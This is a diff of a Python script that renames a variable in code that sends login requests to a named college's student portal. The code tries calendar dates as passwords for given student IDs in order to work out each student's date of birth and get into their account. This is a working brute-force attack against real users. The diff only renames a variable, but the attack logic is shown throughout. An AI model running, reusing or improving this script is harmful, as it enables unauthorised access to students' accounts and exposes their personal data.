@@ -3,7 +3,7 @@ import mysql.connector
 
 student_login_url = 'http://studentlogin.kcgcollege.ac.in/'
 
-payload = {
+student_login_payload = {
     '__EVENTTARGET' : '' ,
     '__EVENTARGUMENT' : '',
     '__LASTFOCUS' : '',
@@ -30,12 +30,12 @@ def get_years(u_id, reg_no_):
 
 def check_date(The_day_):
 
-    global time_out_dates, payload
+    global time_out_dates, student_login_payload
 
-    payload['txtpassword'] = The_day_
+    student_login_payload['txtpassword'] = The_day_
                 
     try:
-        page = requests.post(student_login_url, data = payload, timeout = 10)
+        page = requests.post(student_login_url, data = student_login_payload, timeout = 10)
         #print(The_day_)
     except:
         #print('timed out', The_day_)
@@ -69,7 +69,7 @@ def find_student_dob(user_id, year_of_birth = None):
         reg_no_ = False
 
         if user_id[:4] == '3110' :
-            payload['rblOnlineAppLoginMode'] = '1'
+            student_login_payload['rblOnlineAppLoginMode'] = '1'
             reg_no_ = True        
 
         months = {
@@ -78,7 +78,7 @@ def find_student_dob(user_id, year_of_birth = None):
             '09' : 30, '10' : 31, '11' : 30, '12' : 31,
         }
 
-        payload['txtuname'] = user_id
+        student_login_payload['txtuname'] = user_id
         The_day = None
     
         if year_of_birth == None:
